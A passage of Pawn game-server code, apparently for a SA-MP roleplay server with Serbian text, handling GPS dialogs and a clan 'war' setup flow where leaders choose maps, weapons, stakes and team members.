			    if( sscanf( inputtext, "d", broj ) ) return ShowPlayerDialog( playerid, dialog_GPS, DIALOG_STYLE_INPUT, "{FFFFFF}Izaberi lokaciju:", "{FFFFFF}* Unesite id firme do koje zelite da odete:", "Potvrdi", "Odustani" );
                if( BusinessInfo[ broj ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

				setPlayerGps( playerid, BusinessInfo[ broj ][ bEnterX ], BusinessInfo[ broj ][ bEnterY ], BusinessInfo[ broj ][ bEnterZ ] );
			}
			case MAPPED_QUESTS:
			{
				switch(listitem) 
				{
					case 0:
					{
						setPlayerGps(playerid, 1425.3727, -1357.0684, 13.5752);
					}
					case 1:
					{
						setPlayerGps(playerid, 2035.9337, -1308.2856, 20.8965);
					}
				}
			}
		}
	}
	else if(dialogid == dialog_WAR && response )
	{
        if( listitem == 0 ) ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_1, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi mapu:", "Mapa 1 - Abandoned\nMapa 2 - RC Battlefield\nMapa 3 - Skladiste\nMapa 4 - United\nMapa 5 - Farma", "Odaberi", "Ponisti");
        if( listitem == 1 ) ShowPlayerDialog( playerid, dialog_WARUBACI, DIALOG_STYLE_INPUT, "{FFFFFF}Ubacivanje igraca:", "{FFFFFF}* Unesite id igraca iz tvog tima:", "Uredu", "Ponisti");
        if( listitem == 2 ) ShowPlayerDialog( playerid, dialog_WARIZBACI, DIALOG_STYLE_INPUT, "{FFFFFF}Izbacivanje igraca:", "{FFFFFF}* Unesite id igraca iz tvog tima:", "Uredu", "Ponisti");
    }
    else if(dialogid == dialog_WARIZBACI && response )
	{
        if( WARPInfo[ playerid ][ WARIgrac ] == -1 ) return SendErrorMessage( playerid, "Niste u waru." );
        new igrac, w = WARPInfo[ playerid ][ WARIgrac ];
		if( sscanf( inputtext, "u", igrac ) ) return ShowPlayerDialog( playerid, dialog_WARIZBACI, DIALOG_STYLE_INPUT, "{FFFFFF}Izbacivanje igraca:", "{FFFFFF}* Unesite id igraca iz tvog tima:", "Uredu", "Ponisti");
        if( WARInfo[ w ][ WARAktivan ] == false ) return SendErrorMessage( playerid, "War nije jos startovan.");
        if( igrac == IPI ) return ShowPlayerDialog( playerid, dialog_WARIZBACI, DIALOG_STYLE_INPUT, "{FFFFFF}Izbacivanje igraca:", "{FFFFFF}* Unesite id igraca iz tvog tima:", "Uredu", "Ponisti");
        if( PlayerInfo[ igrac ][ xClan ] != PlayerInfo[ playerid ][ xLider ] ) return ShowPlayerDialog( playerid, dialog_WARIZBACI, DIALOG_STYLE_INPUT, "{FFFFFF}Izbacivanje igraca:", "{FFFFFF}* Unesite id igraca iz tvog tima:", "Uredu", "Ponisti");
		if( WARPInfo[ igrac ][ WARIgrac ] == -1 ) return ShowPlayerDialog( playerid, dialog_WARIZBACI, DIALOG_STYLE_INPUT, "{FFFFFF}Izbacivanje igraca:", "{FFFFFF}* Unesite id igraca iz tvog tima:", "Uredu", "Ponisti");
		SetPlayerHealth( igrac, 100 );

        SMG_SetPlayerPos( igrac, PozicijaWAR[ igrac ][ 0 ], PozicijaWAR[ igrac ][ 1 ],  PozicijaWAR[ igrac ][ 2 ] );
        SetPlayerVirtualWorld( igrac, VirtualWWAR[ igrac ] );
        SetPlayerInterior( igrac, InteriorWAR[ igrac ] );
		ResetPlayerWeapons( igrac );
        WARPInfo[ igrac ][ WARIgrac ] = -1;
        ResetujWarIgraca( igrac );
        if( WARPInfo[ playerid ][ WARTim ][ 0 ] == true ) { WARInfo[ w ][ WARTimClanovi ][ 0 ]--; }
        if( WARPInfo[ playerid ][ WARTim ][ 1 ] == true ) { WARInfo[ w ][ WARTimClanovi ][ 1 ]--; }

        SendClientMessage( playerid, 0xFF0000FF, "(WAR): Izbacio si clana iz war-a." );

        WarTDControl( igrac, false );
	}
    else if(dialogid == dialog_WARUBACI && response )
	{
		if( WARPInfo[ playerid ][ WARIgrac ] == -1 ) return SendErrorMessage( playerid, "Niste u waru." );
        new igrac, w = WARPInfo[ playerid ][ WARIgrac ];
		if( sscanf( inputtext, "u", igrac ) ) return ShowPlayerDialog( playerid, dialog_WARUBACI, DIALOG_STYLE_INPUT, "{FFFFFF}Ubacivanje igraca", "{FFFFFF}* Unesite id igraca iz tvog tima:", "Uredu", "Ponisti");
        if( WARInfo[ w ][ WARAktivan ] == false ) return SendErrorMessage( playerid, "War nije jos startovan.");
		if( igrac == playerid ) return ShowPlayerDialog( playerid, dialog_WARUBACI, DIALOG_STYLE_INPUT, "{FFFFFF}Ubacivanje igraca:", "{FFFFFF}* Unesite id igraca iz tvog tima:", "Uredu", "Ponisti");
        if( igrac == IPI ) return ShowPlayerDialog( playerid, dialog_WARUBACI, DIALOG_STYLE_INPUT, "{FFFFFF}Ubacivanje igraca:", "{FFFFFF}* Unesite id igraca iz tvog tima:", "Uredu", "Ponisti");
		if( PlayerInfo[ igrac ][ xClan ] != PlayerInfo[ playerid ][ xLider ] ) return ShowPlayerDialog( playerid, dialog_WARUBACI, DIALOG_STYLE_INPUT, "{FFFFFF}Ubacivanje igraca:", "{FFFFFF}* Unesite id igraca iz tvog tima:", "Uredu", "Ponisti");
		if( WARPInfo[ igrac ][ WARIgrac ] != -1 ) return ShowPlayerDialog( playerid, dialog_WARUBACI, DIALOG_STYLE_INPUT, "{FFFFFF}Ubacivanje igraca:", "{FFFFFF}* Unesite id igraca iz tvog tima:", "Uredu", "Ponisti");
        if( PlayerInvited[ igrac ] > 0 ) return SendErrorMessage( playerid, "Ne mozete ubaciti igraca koji je na eventu." );
		if( PlayerInfo[ igrac ][ xWanted ] > 0 ) return SendErrorMessage( playerid, "Ne mozete ubaciti igraca koji ima wanted level." );
		if( PlayerInfo[ igrac ][ xZatvor ] > 0 ) return SendErrorMessage( playerid, "Ne mozete ubaciti igraca koji ima je u zatvoru." );
		if( WARPInfo[ playerid ][ WARTim ][ 0 ] == true )
		{
			if( WARInfo[ w ][ WARTimClanovi ][ 0 ] >= WARInfo[ w ][ WARMaxClanova ] ) return SendErrorMessage(playerid, "Imate maksimalan broj clanova u waru!");

			GetPlayerPos( igrac, PozicijaWAR[ igrac ][ 0 ], PozicijaWAR[ igrac ][ 1 ], PozicijaWAR[ igrac ][ 2 ] );
			VirtualWWAR[ igrac ] = GetPlayerVirtualWorld( igrac );
            InteriorWAR[ igrac ] = GetPlayerInterior( igrac );

            new rand1 = random( sizeof( RandomWARMapa11 ) ),
            	rand21 = random( sizeof( RandomWARMapa21 ) ),
            	rand31 = random( sizeof( RandomWARMapa31 ) ),
            	rand41 = random( sizeof( RandomWARMapa41 ) ),
            	rand51 = random( sizeof( RandomWARMapa51 ) );

            if(WARInfo[ w ][ WARMapa ] == 1 )
			{
				SMG_SetPlayerPos( igrac, RandomWARMapa11[ rand1 ][ 0 ], RandomWARMapa11[ rand1 ][ 1 ],RandomWARMapa11[ rand1 ][ 2 ] );
                SetPlayerInterior( playerid, 0 );
			}
            else if(WARInfo[ w ][ WARMapa ] == 2 )
			{
				SMG_SetPlayerPos( igrac, RandomWARMapa21[ rand21 ][ 0 ], RandomWARMapa21[ rand21 ][ 1 ],RandomWARMapa21[ rand21 ][ 2 ] );
				SetPlayerInterior( igrac, 10 );
			}
            else if(WARInfo[ w ][ WARMapa ] == 3 )
			{
				SMG_SetPlayerPos( igrac, RandomWARMapa31[ rand31 ][ 0 ], RandomWARMapa31[ rand31 ][ 1 ],RandomWARMapa31[ rand31 ][ 2 ] );
				SetPlayerInterior( igrac, 0 );
			}
            else if(WARInfo[ w ][ WARMapa ] == 4 )
			{
				SMG_SetPlayerPos( igrac, RandomWARMapa41[ rand41 ][ 0 ], RandomWARMapa41[ rand41 ][ 1 ],RandomWARMapa41[ rand41 ][ 2 ] );
				SetPlayerInterior( igrac, 0 );
			}
            else if(WARInfo[ w ][ WARMapa ] == 5 )
			{
				SMG_SetPlayerPos( igrac, RandomWARMapa51[ rand51 ][ 0 ], RandomWARMapa51[ rand51 ][ 1 ],RandomWARMapa51[ rand51 ][ 2 ] );
				SetPlayerInterior( igrac, 0 );
			}

			GiveWeaponToPlayer( igrac, WARInfo[ w ][ WAROruzje ][ 0 ], 300 );
			GiveWeaponToPlayer( igrac, WARInfo[ w ][ WAROruzje ][ 1 ], 300 );
			GiveWeaponToPlayer( igrac, WARInfo[ w ][ WAROruzje ][ 2 ], 300 );
			GiveWeaponToPlayer( igrac, WARInfo[ w ][ WAROruzje ][ 3 ], 300 );
			SetPlayerVirtualWorld( igrac, w );
			SetPlayerHealth( igrac, 100 );
			SetPlayerArmour( igrac, 100 );

			WARInfo[ w ][ WARTimClanovi ][ 0 ]++;

			ResetujWarIgraca( igrac );
    		WARPInfo[ igrac ][ WARTim ][ 0 ] = true;
    		WARPInfo[ igrac ][ WARIgrac ] = w;

  		    SCMF( igrac, 0xFFAF00FF, "(WAR): Tim 1 - {FFFFFF}%s {FFAF00}| Tim 2 - {FFFFFF}%s", getOrgName( PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ xClan ] ), getOrgName( PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ xClan ] ) );
    		SendClientMessage( igrac, 0xFFAF00FF, "(WAR): Da koristite chat kucajte [ /wp ]. Da napustite war kucajte [ /warnapusti ]." );
    		SendClientMessage( playerid, 0xFFAF00FF, "(WAR): Ubacio si clana u war." );

    		WarTDControl( igrac, true );
    		SetWarStatsTD( w );
		}
		else if( WARPInfo[ playerid ][ WARTim ][ 1 ] == true )
		{
			if( WARInfo[ w ][ WARTimClanovi ][ 1 ] >= WARInfo[ w ][ WARMaxClanova ] ) return SendErrorMessage(playerid, "Imate maksimalan broj clanova u waru!");

			GetPlayerPos( igrac, PozicijaWAR[ igrac ][ 0 ], PozicijaWAR[ igrac ][ 1 ], PozicijaWAR[ igrac ][ 2 ] );
			VirtualWWAR[ igrac ] = GetPlayerVirtualWorld( igrac );
			InteriorWAR[ igrac ] = GetPlayerInterior( igrac );

		    new rand2 = random( sizeof( RandomWARMapa12 ) ),
		    	rand22 = random( sizeof( RandomWARMapa22 ) ),
		    	rand32 = random( sizeof( RandomWARMapa32 ) ),
		    	rand42 = random( sizeof( RandomWARMapa42 ) ),
		    	rand52 = random( sizeof( RandomWARMapa52 ) );

            if( WARInfo[ w ][ WARMapa ] == 1 )
			{
				SMG_SetPlayerPos( igrac, RandomWARMapa12[ rand2 ][ 0 ], RandomWARMapa12[ rand2 ][ 1 ],RandomWARMapa12[ rand2 ][ 2 ] );
				SetPlayerInterior( igrac, 0 );
			}
            else if( WARInfo[ w ][ WARMapa ] == 2 )
			{
				SMG_SetPlayerPos( igrac, RandomWARMapa22[ rand22 ][ 0 ], RandomWARMapa22[ rand22 ][ 1 ],RandomWARMapa22[ rand22 ][ 2 ] );
				SetPlayerInterior( igrac, 10 );
			}
            else if( WARInfo[ w ][ WARMapa ] == 3 )
			{
				SMG_SetPlayerPos( igrac, RandomWARMapa32[ rand32 ][ 0 ], RandomWARMapa32[ rand32 ][ 1 ],RandomWARMapa32[ rand32 ][ 2 ] );
                SetPlayerInterior( igrac, 0 );
			}
            else if( WARInfo[ w ][ WARMapa ] == 4 )
			{
				SMG_SetPlayerPos( igrac, RandomWARMapa42[ rand42 ][ 0 ], RandomWARMapa42[ rand42 ][ 1 ],RandomWARMapa42[ rand42 ][ 2 ] );
				SetPlayerInterior( igrac, 0 );
			}
            else if( WARInfo[ w ][ WARMapa ] == 5 )
			{
				SMG_SetPlayerPos( igrac, RandomWARMapa52[ rand52 ][ 0 ], RandomWARMapa52[ rand52 ][ 1 ],RandomWARMapa52[ rand52 ][ 2 ] );
				SetPlayerInterior( igrac, 0 );
			}

			GiveWeaponToPlayer( igrac, WARInfo[ w ][ WAROruzje ][ 0 ], 300 );
			GiveWeaponToPlayer( igrac, WARInfo[ w ][ WAROruzje ][ 1 ], 300 );
			GiveWeaponToPlayer( igrac, WARInfo[ w ][ WAROruzje ][ 2 ], 300 );
			GiveWeaponToPlayer( igrac, WARInfo[ w ][ WAROruzje ][ 3 ], 300 );
			SetPlayerVirtualWorld( igrac, w );
			SetPlayerHealth( igrac, 100 );
			SetPlayerArmour( igrac, 100 );

			WARInfo[ w ][ WARTimClanovi ][ 1 ]++;

			ResetujWarIgraca( igrac );
    		WARPInfo[ igrac ][ WARTim ][ 1 ] = true;
    		WARPInfo[ igrac ][ WARIgrac ] = w;

  		    SCMF( igrac, 0xFFAF00FF, "(WAR): Tim 1 - {FFFFFF}%s {FFAF00}| Tim 2 - {FFFFFF}%s", getOrgName( PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ xClan ] ), getOrgName( PlayerInfo[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ xClan ] ) );
    		SendClientMessage( igrac, 0xFFAF00FF, "(WAR): Da koristite chat kucajte [ /wp ]. Da napustite war kucajte [ /warnapusti ]." );
    		SendClientMessage( playerid, 0xFFAF00FF, "(WAR): Ubacio si clana u war." );

    		WarTDControl( igrac, true );
    		SetWarStatsTD( w );
		}
	}
    else if(dialogid == dialog_WAR_ZAKAZI_1 && response)
	{
		if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes u waru dok si u jailu." );
        new warid = -1;
		for( new w = 1; w < MAX_WARS; w ++)
		{
			if( WARInfo[ w ][ WARAktivan ] == false && WARInfo[ w ][ WARKreiranje ] == false )
			{
			    warid = w;
			    break;
			}
		}
		if( warid == -1 ) return SendErrorMessage( playerid, "Vec ima 10 warova u toku, sacekajte da se neki zavrsi." );
		KreiranjeWara[ playerid ] = warid;
		WARInfo[ warid ][ WARKreiranje ] = true;
        WARInfo[ warid ][ WARAktivan ] = false;
        WARInfo[ warid ][ WARCena ] = 0;

        if( listitem == 0 ) { WARInfo[ warid ][ WARMapa ] = 1; }
		if( listitem == 1 ) { WARInfo[ warid ][ WARMapa ] = 2; }
		if( listitem == 2 ) { WARInfo[ warid ][ WARMapa ] = 3; }
		if( listitem == 3 ) { WARInfo[ warid ][ WARMapa ] = 4; }
		if( listitem == 4 ) { WARInfo[ warid ][ WARMapa ] = 5; }

        ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_2, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi oruzje slot 1:", "Deagle\nColt 45\nSilenced Pistol", "Odaberi", "Ponisti" );
	}
	else if(dialogid == dialog_WAR_ZAKAZI_2 )
	{
		if( response )
		{
		    new w = KreiranjeWara[ playerid ];
		    if( listitem == 0 ) { WARInfo[ w ][ WAROruzje ][ 0 ] = 24; }
		    if( listitem == 1 ) { WARInfo[ w ][ WAROruzje ][ 0 ] = 22; }
		    if( listitem == 2 ) { WARInfo[ w ][ WAROruzje ][ 0 ] = 23; }
		    ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_3, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi oruzje slot 2:", "Uzi\nMP5", "Odaberi", "Ponisti");
		}
		else if( !response )
		{
		    new w = KreiranjeWara[ playerid ];
			WARInfo[ w ][ WARKreiranje ] = false;
	        WARInfo[ w ][ WARAktivan ] = false;
	        KreiranjeWara[ playerid ] = -1;
		}
	}
	else if(dialogid == dialog_WAR_ZAKAZI_3 )
	{
		if( response )
		{
		    new w = KreiranjeWara[ playerid ];
		    if( listitem == 0 ) { WARInfo[ w ][ WAROruzje ][ 1 ] = 28; }
		    if( listitem == 1 ) { WARInfo[ w ][ WAROruzje ][ 1 ] = 29; }
		    ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_4, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi oruzje slot 3:", "AK-47\nM16", "Odaberi", "Ponisti");
		}
		else if( !response )
		{
		    new w = KreiranjeWara[ playerid ];
			WARInfo[ w ][ WARKreiranje ] = false;
	        WARInfo[ w ][ WARAktivan ] = false;
	        KreiranjeWara[ playerid ] = -1;
		}
	}
	else if(dialogid == dialog_WAR_ZAKAZI_4 )
	{
		if( response )
		{
		    new w = KreiranjeWara[ playerid ];
		    if( listitem == 0 ) { WARInfo[ w ][ WAROruzje ][ 2 ] = 30; }
		    if( listitem == 1 ) { WARInfo[ w ][ WAROruzje ][ 2 ] = 31; }
		    ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_5, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi oruzje slot 4:", "Country Rifle\nShotgun", "Odaberi", "Ponisti");
		}
		else if( !response )
		{
		    new w = KreiranjeWara[ playerid ];
			WARInfo[ w ][ WARKreiranje ] = false;
	        WARInfo[ w ][ WARAktivan ] = false;
	        KreiranjeWara[ playerid ] = -1;
		}
	}
	else if(dialogid == dialog_WAR_ZAKAZI_5 )
	{
		if( response )
		{
		    new w = KreiranjeWara[ playerid ];
		    if( listitem == 0 ) { WARInfo[ w ][ WAROruzje ][ 3 ] = 33; }
		    if( listitem == 1 ) { WARInfo[ w ][ WAROruzje ][ 3 ] = 25; }
		    ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_9, DIALOG_STYLE_INPUT, "{FFFFFF}Ulaganje novca:", "{FFFFFF}* Unesite para koliko zelite da ulozite u war, protivncki lider mora isto toliko da ulozi. Ako uneses 0 onda nema uloga.", "Odaberi", "Ponisti");
		}
		else if( !response )
		{
		    new w = KreiranjeWara[ playerid ];
			WARInfo[ w ][ WARKreiranje ] = false;
	        WARInfo[ w ][ WARAktivan ] = false;
	        KreiranjeWara[ playerid ] = -1;
		}
	}
	else if(dialogid == dialog_WAR_ZAKAZI_9 )
	{
	    if( response )
		{
	        new w = KreiranjeWara[ playerid ], novac;
	        if( sscanf( inputtext, "i", novac ) ) return ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_9, DIALOG_STYLE_INPUT, "{FFFFFF}Ulaganje novca:", "{FFFFFF}* Unesite para koliko zelite da ulozite u war, protivncki lider mora isto toliko da ulozi. Ako uneses 0 onda nema uloga.", "Odaberi", "Ponisti");
	        if( PlayerInfo[ playerid ][ xNovac ] < novac ) return ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_9, DIALOG_STYLE_INPUT, "{FFFFFF}Nemate dovoljno novca:", "{FFFFFF}* Unesite para koliko zelite da ulozite u war, protivncki lider mora isto toliko da ulozi. Ako uneses 0 onda nema uloga.", "Odaberi", "Ponisti");
			if( novac < 0 || novac > 100000 ) return ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_9, DIALOG_STYLE_INPUT, "{FFFFFF}Ulaganje novca:", "{FFFFFF}* Unesite para koliko zelite da ulozite u war, protivncki lider mora isto toliko da ulozi. Ako uneses 0 onda nema uloga.", "Odaberi", "Ponisti");

			WARInfo[ w ][ WARCena ] = novac;
			ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_6, DIALOG_STYLE_INPUT, "{FFFFFF}Maximum clanova:", "{FFFFFF}* Upisite koliko maximum clanova ce biti u waru(3 > 10).", "Odaberi", "Ponisti");
	    }
	    else if( !response )
		{
		    new w = KreiranjeWara[ playerid ];
			WARInfo[ w ][ WARKreiranje ] = false;
	        WARInfo[ w ][ WARAktivan ] = false;
	        KreiranjeWara[ playerid ] = -1;
		}
	}
	else if(dialogid == dialog_WAR_ZAKAZI_6 )
	{
	    if( response )
		{
		    new maxigraca, w = KreiranjeWara[ playerid ];
			if( sscanf( inputtext, "i", maxigraca ) ) return ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_6, DIALOG_STYLE_INPUT, "{FFFFFF}Maximum clanova:", "{FFFFFF}* Upisite koliko maximum clanova ce biti u waru(3 > 10).", "Odaberi", "Ponisti");
			if( maxigraca < 3 || maxigraca > 10 ) return ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_6, DIALOG_STYLE_INPUT, "{FFFFFF}Maximum clanova:", "{FFFFFF}* Upisite koliko maximum clanova ce biti u waru(3 > 10).", "Odaberi", "Ponisti");
	        WARInfo[ w ][ WARMaxClanova ] = maxigraca;
	        ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_7, DIALOG_STYLE_INPUT, "{FFFFFF}Lider Protivnika:", "{FFFFFF}* Upisite id lidera protivnicke orge:", "Odaberi", "Ponisti" );
		}
		else
		{
		    new w = KreiranjeWara[ playerid ];
			WARInfo[ w ][ WARKreiranje ] = false;
	        WARInfo[ w ][ WARAktivan ] = false;
	        KreiranjeWara[ playerid ] = -1;
		}
	}
	else if(dialogid == dialog_WAR_ZAKAZI_7 )
	{
	    if( response )
		{
		    new id, w = KreiranjeWara[ playerid ], string[ 128 ];
			if( sscanf( inputtext, "u", id ) ) return ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_7, DIALOG_STYLE_INPUT, "{FFFFFF}Lider Protivnika:", "{FFFFFF}* Upisite id lidera protivnicke orge:", "Odaberi", "Ponisti" );
			if( id == IPI || id == playerid || PlayerInfo[ playerid ][ xLider ] == PlayerInfo[ id ][ xLider ] || PlayerInfo[ id ][ xLider ] < 1 ) return ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_7, DIALOG_STYLE_INPUT, "{FFFFFF}Lider Protivnika:", "{FFFFFF}* Upisite id lidera protivnicke orge:", "Odaberi", "Ponisti" );

			if( org_info[ PlayerInfo[ id ][ xClan ] ][ oTip ] == ORG_TIP_VLADINA &&
				org_info[ PlayerInfo[ id ][ xClan ] ][ oTip ] == ORG_TIP_HITMAN ) return ShowPlayerDialog( playerid, dialog_WAR_ZAKAZI_7, DIALOG_STYLE_INPUT, "{FFFFFF}Lider Protivnika:", "{FFFFFF}* Upisite id lidera protivnicke orge:", "Odaberi", "Ponisti" );

			if( PlayerInfo[ id ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes u waru pozvati lidera koji je u jailu." );
			WARInfo[ w ][ WARTimLider ][ 0 ] = playerid;
			WARInfo[ w ][ WARTimLider ][ 1 ] = id;
            KreiranjeWara[ id ] = w;

			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			format( string, sizeof( string ), "{FFAF00}- Oruzje 1: {FFFFFF}%s\n", WeaponInfos[ WARInfo[ w ][ WAROruzje ][ 0 ] ][ wName ] );
			strcat( DialogStrgEx, string );
			format( string, sizeof( string ), "{FFAF00}- Oruzje 2: {FFFFFF}%s\n", WeaponInfos[ WARInfo[ w ][ WAROruzje ][ 1 ] ][ wName ] );
			strcat( DialogStrgEx, string );
			format( string, sizeof( string ), "{FFAF00}- Oruzje 3: {FFFFFF}%s\n", WeaponInfos[ WARInfo[ w ][ WAROruzje ][ 2 ] ][ wName ] );
			strcat( DialogStrgEx, string );
			format( string, sizeof( string ), "{FFAF00}- Maksimalni broj clanova: {FFFFFF}%d\n\n", WARInfo[ w ][ WARMaxClanova ] );
			strcat( DialogStrgEx, string );
			format( string, sizeof( string ), "{FFAF00}- Ulog novca: {FFFFFF}$%d\n\n", WARInfo[ w ][ WARCena ] );
			strcat( DialogStrgEx, string );
			format( string, sizeof( string ), "{FFAF00}- Lider {FFFFFF}%s {FFAF00}vam je poslao zahtev za war.", getOrgName( PlayerInfo[ playerid ][ xClan ] ) );
			strcat( DialogStrgEx, string );
			ShowPlayerDialog( id, dialog_WAR_ZAKAZI_8, DIALOG_STYLE_MSGBOX, "{FFFFFF}Zahtev za war:", DialogStrgEx, "Prihvati", "Odbij" );
			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
        }
		else if( !response )
		{
		    new w = KreiranjeWara[ playerid ];
			WARInfo[ w ][ WARKreiranje ] = false;
	        WARInfo[ w ][ WARAktivan ] = false;
	        KreiranjeWara[ playerid ] = -1;
		}
	}
	else if(dialogid == dialog_WAR_ZAKAZI_8 )
	{
	    if( response )
		{
	        new w = KreiranjeWara[ playerid ];
	        if( PlayerInfo[ playerid ][ xNovac ] < WARInfo[ w ][ WARCena ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca za ulog." );

		    SendClientMessage( WARInfo[ w ][ WARTimLider ][ 1 ], 0xFFAF00FF, "(WAR): Prihvatio si poziv za war ubaci svoje igrace.");
	        SendClientMessage( WARInfo[ w ][ WARTimLider ][ 0 ], 0xFFAF00FF, "(WAR): Igrac je prihvatio poziv za war ubaci svoje igrace.");

            DajIgracuNovac( WARInfo[ w ][ WARTimLider ][ 0 ], -WARInfo[ w ][ WARCena ] );
            DajIgracuNovac( WARInfo[ w ][ WARTimLider ][ 1 ], -WARInfo[ w ][ WARCena ] );

            GetPlayerPos( WARInfo[ w ][ WARTimLider ][ 0 ], PozicijaWAR[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ 0 ], PozicijaWAR[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ 1 ],  PozicijaWAR[ WARInfo[ w ][ WARTimLider ][ 0 ] ][ 2 ] );
			VirtualWWAR[ WARInfo[ w ][ WARTimLider ][ 0 ] ] = GetPlayerVirtualWorld( WARInfo[ w ][ WARTimLider ][ 0 ] );
            InteriorWAR[ WARInfo[ w ][ WARTimLider ][ 0 ] ] = GetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 0 ] );

            GetPlayerPos( WARInfo[ w ][ WARTimLider ][ 1 ], PozicijaWAR[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ 0 ], PozicijaWAR[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ 1 ],  PozicijaWAR[ WARInfo[ w ][ WARTimLider ][ 1 ] ][ 2 ] );
            VirtualWWAR[ WARInfo[ w ][ WARTimLider ][ 1 ] ] = GetPlayerVirtualWorld( WARInfo[ w ][ WARTimLider ][ 0 ] );
            InteriorWAR[ WARInfo[ w ][ WARTimLider ][ 1 ] ] = GetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 1 ] );

            if( WARInfo[ w ][ WARMapa ] == 1 )
			{
                new rand1 = random( sizeof( RandomWARMapa11 ) ), rand2 = random( sizeof( RandomWARMapa12 ) );
                SMG_SetPlayerPos( WARInfo[ w ][ WARTimLider ][ 0 ], RandomWARMapa11[ rand1 ][ 0 ], RandomWARMapa11[ rand1 ][ 1 ],RandomWARMapa11[ rand1 ][ 2 ] );
            	SMG_SetPlayerPos( WARInfo[ w ][ WARTimLider ][ 1 ], RandomWARMapa12[ rand2 ][ 0 ], RandomWARMapa12[ rand2 ][ 1 ],RandomWARMapa12[ rand2 ][ 2 ] );
                SetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 0 ], 0 );
                SetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 1 ], 0 );
			}
            else if( WARInfo[ w ][ WARMapa ] == 2 )
			{
                new rand1 = random( sizeof( RandomWARMapa21 ) ), rand2 = random( sizeof( RandomWARMapa22 ) );
		    	SMG_SetPlayerPos( WARInfo[ w ][ WARTimLider ][ 0 ], RandomWARMapa21[ rand1 ][ 0 ], RandomWARMapa21[ rand1 ][ 1 ],RandomWARMapa21[ rand1 ][ 2 ] );
		    	SMG_SetPlayerPos( WARInfo[ w ][ WARTimLider ][ 1 ], RandomWARMapa22[ rand2 ][ 0 ], RandomWARMapa22[ rand2 ][ 1 ],RandomWARMapa22[ rand2 ][ 2 ] );
                SetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 0 ], 10 );
                SetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 1 ], 10 );
			}
			else if( WARInfo[ w ][ WARMapa ] == 3 )
			{
			    new rand1 = random( sizeof( RandomWARMapa31 ) ), rand2 = random( sizeof( RandomWARMapa32 ) );
                SMG_SetPlayerPos( WARInfo[ w ][ WARTimLider ][ 0 ], RandomWARMapa31[ rand1 ][ 0 ], RandomWARMapa31[ rand1 ][ 1 ],RandomWARMapa31[ rand1 ][ 2 ] );
            	SMG_SetPlayerPos( WARInfo[ w ][ WARTimLider ][ 1 ], RandomWARMapa32[ rand2 ][ 0 ], RandomWARMapa32[ rand2 ][ 1 ],RandomWARMapa32[ rand2 ][ 2 ] );
             	SetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 0 ], 0 );
                SetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 1 ], 0 );
			}
			else if( WARInfo[ w ][ WARMapa ] == 4 )
			{
			    new rand1 = random( sizeof( RandomWARMapa41 ) ), rand2 = random( sizeof( RandomWARMapa42 ) );
                SMG_SetPlayerPos( WARInfo[ w ][ WARTimLider ][ 0 ], RandomWARMapa41[ rand1 ][ 0 ], RandomWARMapa41[ rand1 ][ 1 ],RandomWARMapa41[ rand1 ][ 2 ] );
            	SMG_SetPlayerPos( WARInfo[ w ][ WARTimLider ][ 1 ], RandomWARMapa42[ rand2 ][ 0 ], RandomWARMapa42[ rand2 ][ 1 ],RandomWARMapa42[ rand2 ][ 2 ] );
            	SetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 0 ], 0 );
                SetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 1 ], 0 );
			}
			else if( WARInfo[ w ][ WARMapa ] == 5 )
			{
			    new rand1 = random( sizeof( RandomWARMapa51 ) ), rand2 = random( sizeof( RandomWARMapa52 ) );
                SMG_SetPlayerPos( WARInfo[ w ][ WARTimLider ][ 0 ], RandomWARMapa51[ rand1 ][ 0 ], RandomWARMapa51[ rand1 ][ 1 ],RandomWARMapa51[ rand1 ][ 2 ] );
            	SMG_SetPlayerPos( WARInfo[ w ][ WARTimLider ][ 1 ], RandomWARMapa52[ rand2 ][ 0 ], RandomWARMapa52[ rand2 ][ 1 ],RandomWARMapa52[ rand2 ][ 2 ] );
                SetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 0 ], 0 );
                SetPlayerInterior( WARInfo[ w ][ WARTimLider ][ 1 ], 0 );
			}

			WARInfo[ w ][ WARAktivan ] = true;

